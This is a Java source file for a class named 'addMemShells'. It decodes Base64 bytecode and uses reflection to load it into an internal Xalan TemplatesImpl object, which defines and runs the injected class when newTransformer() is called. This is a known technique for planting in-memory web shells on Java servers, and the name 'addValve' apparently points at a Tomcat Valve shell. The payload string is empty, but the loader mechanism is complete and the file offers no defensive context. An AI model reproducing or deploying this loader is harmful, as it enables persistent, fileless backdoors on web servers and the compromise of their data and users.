import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;


import java.lang.reflect.Field;
import java.util.Base64;

public class addMemShells {
    public addMemShells() throws Exception{
        String codes = "";
        byte[] decode = Base64.getDecoder().decode(codes);
        Class<?> aClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        TemplatesImpl o = (TemplatesImpl)aClass.newInstance();
        setFieldValue(o,"_name","addValve");
        setFieldValue(o,"_bytecodes",new byte[][]{decode});
        Class<?> aClass1 = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl");
        setFieldValue(o,"_tfactory",(TransformerFactoryImpl)aClass1.newInstance());
        o.newTransformer();
    }

    public static void setFieldValue(Object obj, String FieldName, Object setObj){
        try {
            Field field = obj.getClass().getDeclaredField(FieldName);
            field.setAccessible(true);
            field.set(obj,setObj);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
